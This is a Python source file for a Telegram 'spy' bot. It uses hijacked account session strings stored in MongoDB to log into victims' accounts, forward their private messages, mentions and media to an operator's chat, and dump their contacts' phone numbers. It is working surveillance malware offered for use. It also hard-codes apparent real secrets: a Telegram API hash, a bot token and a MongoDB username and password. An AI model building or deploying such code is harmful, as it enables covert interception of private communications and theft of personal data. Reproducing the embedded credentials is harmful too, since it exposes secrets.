import os
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from pymongo import MongoClient
from flask import Flask
from threading import Thread
from datetime import datetime

# --- Configurations ---
API_ID = 38225985
API_HASH = "0b6330bc916f9e29d6bf302be079e9d6"
BOT_TOKEN = "8738081667:AAGr7HkSxO6nC_QhPJJElKR2VKABTEDfNEo"
OWNER_ID = 6015356597
REPORT_CHAT = -1003836655698

# MongoDB Setup
MONGO_URI = "mongodb://khantphyoemin537_db_user:9VRKiaeZkz7rJdpz@cluster0-shard-00-00.w6tgi8j.mongodb.net:27017,cluster0-shard-00-01.w6tgi8j.mongodb.net:27017,cluster0-shard-00-02.w6tgi8j.mongodb.net:27017/?ssl=true&replicaSet=atlas-w6tgi8j-shard-0&authSource=admin&retryWrites=true&w=majority&tlsAllowInvalidCertificates=true"

db_client = MongoClient(MONGO_URI)
db = db_client["SpySystem_DB"]
sessions_db = db["active_strings"]
spy_logs = db["spy_logs"]

app = Flask(__name__)
@app.route("/")
def home(): return "🦇 Ultimate Spy is Online"

def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

bot = TelegramClient("report_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_clients = {}

# ==========================================
# 🛰 SPY LOGIC (Forwarding Text & Media)
# ==========================================
async def start_client(session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        uid = me.id
        active_clients[uid] = client
        
        sessions_db.update_one({"session": session_str}, {"$set": {"uid": uid, "name": me.first_name}}, upsert=True)

        @client.on(events.NewMessage)
        async def spy_handler(event):
            if event.chat_id == REPORT_CHAT: return
            
            should_report = False
            if event.is_private: should_report = True
            elif event.is_group and (event.mentioned or (event.is_reply and (await event.get_reply_message()).sender_id == uid)):
                should_report = True

            if should_report:
                chat = await event.get_chat()
                chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Unknown'))
                report_text = f"🕵️ **Spy Alert [{me.first_name}]**\n📍 **From:** {chat_name}\n💬 **Text:** {event.raw_text}"
                
                # ပုံ/ဗီဒီယို/ဖိုင် ပါရင်ပါ အကုန်ပို့မယ်
                sent_msg = await bot.send_message(REPORT_CHAT, report_text, file=event.media if event.media else None)
                
                # Delete Sync အတွက် မှတ်ထားမယ်
                spy_logs.insert_one({"report_msg_id": sent_msg.id, "target_uid": uid, "time": datetime.utcnow()})

        await client.run_until_disconnected()
    except Exception as e: print(f"Client Error: {e}")

# ==========================================
# ⚙️ MANAGEMENT COMMANDS
# ==========================================

@bot.on(events.MessageDeleted)
async def delete_handler(event):
    if event.chat_id == REPORT_CHAT:
        for msg_id in event.deleted_ids:
            spy_logs.delete_one({"report_msg_id": msg_id})

@bot.on(events.NewMessage(pattern="/show"))
async def show(event):
    if event.sender_id != OWNER_ID: return
    targets = list(sessions_db.find())
    msg = "🕵️ **Spy Targets:**\n\n"
    for t in targets:
        msg += f"👤 **Name:** {t.get('name')}\n🆔 **ID:** `{t.get('uid')}`\n\n"
    await event.reply(msg)

@bot.on(events.NewMessage(pattern=r"/contacts (\d+)"))
async def get_contacts(event):
    if event.sender_id != OWNER_ID: return
    t_uid = int(event.pattern_match.group(1))
    if t_uid in active_clients:
        client = active_clients[t_uid]
        await event.reply("📇 Contacts စာရင်း ဆွဲနေပါတယ်...")
        try:
            contacts = await client.get_contacts()
            res = f"👤 **Contacts of {t_uid}:**\n\n"
            for c in contacts[:50]:
                res += f"• {c.first_name} - `{c.phone if c.phone else 'No Phone'}`\n"
            await bot.send_message(REPORT_CHAT, res)
        except Exception as e: await event.reply(f"❌ Error: {e}")
    else: await event.reply("❌ Online မရှိပါ။")

async def init_spies():
    for s in sessions_db.find(): asyncio.create_task(start_client(s["session"]))

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.loop.create_task(init_spies())
    bot.run_until_disconnected()
